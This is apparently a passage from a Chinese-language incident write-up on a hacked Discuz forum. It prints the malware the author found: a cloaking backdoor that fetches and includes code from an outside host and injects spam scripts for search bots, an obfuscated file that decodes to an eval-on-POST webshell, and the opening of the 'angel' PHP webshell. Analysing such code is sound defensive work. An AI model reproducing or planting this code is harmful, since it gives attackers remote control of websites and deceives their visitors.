underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">dec0de</span>($<span style="color: #ffeead;">fileDir</span>,$<span style="color: #ffeead;">data</span>){
$<span style="color: #ffeead;">dataArr</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">':'</span>,$<span style="color: #ffeead;">data</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">Keys</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">':'</span>,<span style="color: #ffffff; background-color: #002451;">base64_decode(str_rot13(pack(</span><span style="color: #99ffff;">'H*'</span>,$<span style="color: #ffeead;">dataArr</span>[<span style="color: #ffffff; background-color: #002451;">0</span>]))));
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">News</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">':'</span>,<span style="color: #ffffff; background-color: #002451;">base64_decode(str_rot13(pack(</span><span style="color: #99ffff;">'H*'</span>,$<span style="color: #ffeead;">dataArr</span>[<span style="color: #ffffff; background-color: #002451;">1</span>]))));
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">Links</span>= <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">':'</span>,<span style="color: #ffffff; background-color: #002451;">base64_decode(str_rot13(pack(</span><span style="color: #99ffff;">'H*'</span>,$<span style="color: #ffeead;">dataArr</span>[<span style="color: #ffffff; background-color: #002451;">2</span>]))));
<span style="background-color: #003f8e;"> </span>   @<span style="color: #d1f1a9;">include</span>($<span style="color: #ffeead;">fileDir</span>.<span style="color: #99ffff;">'.Wh0AmI.MODEL'</span>);<span style="color: #ff9da4; font-weight: bold;">die</span>;
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getdata</span>($<span style="color: #ffeead;">data_url</span>){
<span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'curl_exec'</span>)) {
$<span style="color: #ffeead;">sp_curl</span> = @<span style="color: #ffffff; background-color: #002451;">curl_init(</span>);
<span style="color: #ffffff; background-color: #002451;">curl_setopt(</span>$<span style="color: #ffeead;">sp_curl</span>, <span style="color: #ff9da4; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #ffeead;">data_url</span>);
<span style="color: #ffffff; background-color: #002451;">curl_setopt(</span>$<span style="color: #ffeead;">sp_curl</span>, <span style="color: #ff9da4; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #ffffff; background-color: #002451;">0</span>);
<span style="color: #ffffff; background-color: #002451;">curl_setopt(</span>$<span style="color: #ffeead;">sp_curl</span>, <span style="color: #ff9da4; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #ffffff; background-color: #002451;">5</span>);
<span style="color: #ffffff; background-color: #002451;">curl_setopt(</span>$<span style="color: #ffeead;">sp_curl</span>, <span style="color: #ff9da4; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #ffffff; background-color: #002451;">1</span>);
$<span style="color: #ffeead;">contents</span> = @<span style="color: #ffffff; background-color: #002451;">curl_exec(</span>$<span style="color: #ffeead;">sp_curl</span>);
@<span style="color: #ffffff; background-color: #002451;">curl_close(</span>$<span style="color: #ffeead;">sp_curl</span>);
}<span style="color: #d1f1a9;">elseif</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'stream_context_create'</span>)) {
$<span style="color: #ffeead;">sp_cont</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'http'</span> =<span style="color: #bbdaff;">&gt;</span> <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'method'</span> =&gt; <span style="color: #99ffff;">'GET'</span>,<span style="color: #99ffff;">'timeout'</span> =&gt; <span style="color: #ffffff; background-color: #002451;">5</span>));
$<span style="color: #ffeead;">sp_stre</span> = @<span style="color: #ffffff; background-color: #002451;">stream_context_create(</span>$<span style="color: #ffeead;">sp_cont</span>);
$<span style="color: #ffeead;">contents</span> = @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span>$<span style="color: #ffeead;">data_url</span>, <span style="color: #bbdaff;">false</span>, $<span style="color: #ffeead;">sp_stre</span>);
}<span style="color: #d1f1a9;">else</span>{
$<span style="color: #ffeead;">handle</span> = @<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">data_url</span>, <span style="color: #99ffff;">"rb"</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
$<span style="color: #ffeead;">contents</span> = @<span style="color: #ffffff; background-color: #002451;">stream_get_contents(</span>$<span style="color: #ffeead;">handle</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
@<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">handle</span>);
}
<span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">contents</span>;
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">show</span>($<span style="color: #ffeead;">fileDir</span>){
$<span style="color: #ffeead;">filename</span>=$<span style="color: #ffeead;">fileDir</span><span style="color: #ff9da4; font-weight: bold;">.</span><span style="color: #ffffff; background-color: #002451;">md5(</span>$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_HOST'</span>].$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'REQUEST_URI'</span>]);
<span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">is_file(</span>$<span style="color: #ffeead;">filename</span>)){
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span>=@<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">filename</span>,<span style="color: #99ffff;">'r'</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">data</span>=@<span style="color: #ffffff; background-color: #002451;">fread(</span>$<span style="color: #ffeead;">fp</span>,<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">filename</span>));
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">empty(</span>$<span style="color: #ffeead;">data</span>)) {@<span style="color: #ffffff; background-color: #002451;">unlink(</span>$<span style="color: #ffeead;">filename</span>);<span style="color: #d1f1a9;">return</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">dec0de(</span>$<span style="color: #ffeead;">fileDir</span>,$<span style="color: #ffeead;">data</span>);
} <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">data</span>=<span style="color: #ffffff; background-color: #002451;">getdata(</span><span style="color: #99ffff;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_H</span><span style="color: #99ffff; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span>=@<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">filename</span>,<span style="color: #99ffff;">'w'</span>);
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">fp</span>,$<span style="color: #ffeead;">data</span>);
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">strlen(</span>$<span style="color: #ffeead;">data</span>) &gt; <span style="color: #ffffff; background-color: #002451;">1000</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">dec0de(</span>$<span style="color: #ffeead;">fileDir</span>,$<span style="color: #ffeead;">data</span>);
<span style="background-color: #003f8e;"> </span>   }
}}
<span style="color: #d1f1a9;">if</span>(!<span style="color: #ffffff; background-color: #002451;">in_array(</span>$<span style="color: #ffeead;">IP</span>,$<span style="color: #ffeead;">KIP</span>)){
<span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">KBot</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">KBots</span>){<span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">stristr(</span>$<span style="color: #ffeead;">Bot</span>,$<span style="color: #ffeead;">KBots</span>)){
<span style="color: #ffffff; background-color: #002451;">show(</span>$<span style="color: #ffeead;">fileDir</span>);
}}<span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">Key</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">Keys</span>){
<span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">stristr(</span>$<span style="color: #ffeead;">Ref</span>,$<span style="color: #ffeead;">Keys</span>)){
<span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #99ffff; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #ebbbff;">&lt;?php</span> $<span style="color: #ffeead;">mt</span>=<span style="color: #99ffff;">"mFsKCleRfU"</span>; $<span style="color: #ffeead;">ojj</span>=<span style="color: #99ffff;">"IEBleldle"</span>; $<span style="color: #ffeead;">hsa</span>=<span style="color: #99ffff;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #ffeead;">fnx</span>=<span style="color: #99ffff;">"Ow=="</span>; $<span style="color: #ffeead; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">str_replace(</span><span style="color: #99ffff; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffeead; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffeead; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #99ffff; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffeead; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffeead; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #99ffff; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffeead; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffeead; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">ef</span><span style="text-decoration: underline;">($</span><span style="color: #ffeead; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #99ffff; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">""</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">ojj</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">hsa</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); $</span><span style="color: #ffeead; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #ffffff; background-color: #002451;">eval(</span>$<span style="color: #bbdaff;">_POST</span>[<span style="color: #99ffff;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #ebbbff;">&lt;?php</span>
<span style="color: #ffffff; background-color: #002451;">error_reporting(7</span>);
@<span style="color: #ffffff; background-color: #002451;">set_magic_quotes_runtime(0</span>);
<span style="color: #ffffff; background-color: #002451;">ob_start(</span>);
$<span style="color: #ffeead;">mtime</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">' '</span>, <span style="color: #ffffff; background-color: #002451;">microtime(</span>));
$<span style="color: #ffeead;">starttime</span> = $<span style="color: #ffeead;">mtime</span>[<span style="color: #ffffff; background-color: #002451;">1</span>] + $<span style="color: #ffeead;">mtime</span>[<span style="color: #ffffff; background-color: #002451;">0</span>];
<span style="color: #ffffff; background-color: #002451;">define(</span><span style="color: #99ffff;">'SA_ROOT'</span>, <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'\\'</span>, <span style="color: #99ffff;">'/'</span>, <span style="color: #ffffff; background-color: #002451;">dirname(</span><span style="color: #bbdaff;">__FILE__</span>)).<span style="color: #99ffff;">'/'</span>);
<span style="color: #ffffff; background-color: #002451;">define(</span><span style="color: #99ffff;">'IS_WIN'</span>, <span style="color: #bbdaff;">DIRECTORY_SEPARATOR</span> == <span style="color: #99ffff;">'\\'</span>);
<span style="color: #ffffff; background-color: #002451;">define(</span><span style="color: #99ffff;">'IS_COM'</span>, <span style="color: #ffffff; background-color: #002451;">class_exists(</span><span style="color: #99ffff;">'COM'</span>) ? <span style="color: #ffffff; background-color: #002451;">1</span> : <span style="color: #ffffff; background-color: #002451;">0</span> );
<span style="color: #ffffff; background-color: #002451;">define(</span><span style="color: #99ffff;">'IS_GPC'</span>, <span style="color: #ffffff; background-color: #002451;">get_magic_quotes_gpc(</span>));
$<span style="color: #ffeead;">dis_func</span> = <span style="color: #ffffff; background-color: #002451;">get_cfg_var(</span><span style="color: #99ffff;">'disable_functions'</span>);
<span style="color: #ffffff; background-color: #002451;">define(</span><span style="color: #99ffff;">'IS_PHPINFO'</span>, (!<span style="color: #ffffff; background-color: #002451;">eregi(</span><span style="color: #99ffff;">"phpinfo"</span>,$<span style="color: #ffeead;">dis_func</span>)) ? <span style="color: #ffffff; background-color: #002451;">1</span> : <span style="color: #ffffff; background-color: #002451;">0</span> );
@<span style="color: #ffffff; background-color: #002451;">set_time_limit(0</span>);@<span style="color: #ffffff; background-color: #002451;">preg_replace(</span><span style="color: #99ffff;">"/[email]/e"</span>,$<span style="color: #bbdaff;">_POST</span>[<span style="color: #99ffff;">'Id'</span>],<span style="color: #99ffff;">"error"</span>);

<span style="color: #d1f1a9;">foreach</span>($<span style="color: #bbdaff;">_POST</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =<span style="color: #bbdaff;">&gt;</span> $<span style="color: #ffeead;">value</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">value</span> = <span style="color: #ffffff; background-color: #002451;">s_array(</span>$<span style="color: #ffeead;">value</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">$key</span> = $<span style="color: #ffeead;">value</span>;
}
<span style="color: #7285b7; font-style: italic;">/*</span><span style="color: #7285b7; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #ffeead;">pass</span>  = <span style="color: #99ffff;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">angel</span>

<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">cookie &#21069;&#32512;</span>
$<span style="color: #ffeead;">cookiepre</span> = <span style="color: #99ffff;">''</span>;
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #ffeead;">cookiedomain</span> = <span style="color: #99ffff;">''</span>;
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #ffeead;">cookiepath</span> = <span style="color: #99ffff;">'/'</span>;
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #ffeead;">cookielife</span> = <span style="color: #ffffff; background-color: #002451;">86400</span>;

<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #ffeead;">writabledb</span> &amp;&amp; $<span style="color: #ffeead;">writabledb</span> = <span style="color: #99ffff;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #7285b7; font-style: italic;">/*</span><span style="color: #7285b7; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

$<span style="color: #ffeead;">charsetdb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">''</span>,<span style="color: #99ffff;">'armscii8'</span>,<span style="color: #99ffff;">'ascii'</span>,<span style="color: #99ffff;">'big5'</span>,<span style="color: #99ffff;">'binary'</span>,<span style="color: #99ffff;">'cp1250'</span>,<span style="color: #99ffff;">'cp1251'</span>,<span style="color: #99ffff;">'cp12</span><span style="color: #99ffff; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'utf8'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'big5'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'gbk'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'latin1'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'euc-kr'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">charset</span> == <span style="color: #99ffff;">'euc-jp'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #ffeead;">self</span> = $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'PHP_SELF'</span>] ? $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'PHP_SELF'</span>] : $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SCRIPT_NAME'</span>];
$<span style="color: #ffeead;">timestamp</span> = <span style="color: #ffffff; background-color: #002451;">time(</span>);

<span style="color: #7285b7; font-style: italic;">/*</span><span style="color: #7285b7; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">"logout"</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">scookie(</span><span style="color: #99ffff;">'loginpass'</span>, <span style="color: #99ffff;">''</span>, -<span style="color: #ffffff; background-color: #002451;">86400</span> * <span style="color: #ffffff; background-color: #002451;">365</span>);
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Location: '</span>.$<span style="color: #ffeead;">self</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
}
<span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">pass</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'login'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">pass</span> == <span style="color: #ffffff; background-color: #002451;">encode_pass(</span>$<span style="color: #ffeead;">password</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">scookie(</span><span style="color: #99ffff;">'loginpass'</span>,<span style="color: #ffffff; background-color: #002451;">encode_pass(</span>$<span style="color: #ffeead;">password</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Location: '</span>.$<span style="color: #ffeead;">self</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #bbdaff;">_COOKIE</span>[<span style="color: #99ffff;">'loginpass'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #bbdaff;">_COOKIE</span>[<span style="color: #99ffff;">'loginpass'</span>] != $<span style="color: #ffeead;">pass</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">loginpage(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">loginpage(</span>);
<span style="background-color: #003f8e;"> </span>   }
}
<span style="color: #7285b7; font-style: italic;">/*</span><span style="color: #7285b7; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

$<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">''</span>;
!$<span style="color: #ffeead;">action</span> &amp;&amp; $<span style="color: #ffeead;">action</span> = <span style="color: #99ffff;">'file'</span>;

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'phpinfo'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">phpinfo(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
